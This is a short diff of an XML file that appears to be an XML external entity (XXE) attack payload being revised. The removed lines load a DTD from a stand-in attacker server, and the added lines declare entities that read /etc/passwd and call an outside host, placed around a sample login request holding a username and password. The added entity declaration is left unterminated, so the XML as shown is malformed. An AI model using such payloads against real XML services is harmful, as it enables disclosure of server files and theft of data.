@@ -1,7 +1,7 @@
-<?xml version="1.0" ?>
-<!DOCTYPE a [
-<!ENTITY % asd SYSTEM "http://ATTACKERSERVER:8090/xxe_file.dtd">
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
+<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html%22%3E
 %asd;
-%c;
-]>
-<a>&rrr;</a>
+%rrr;]>
+<login><username>demo@informatica.com</username><password>Infa123</password></login>
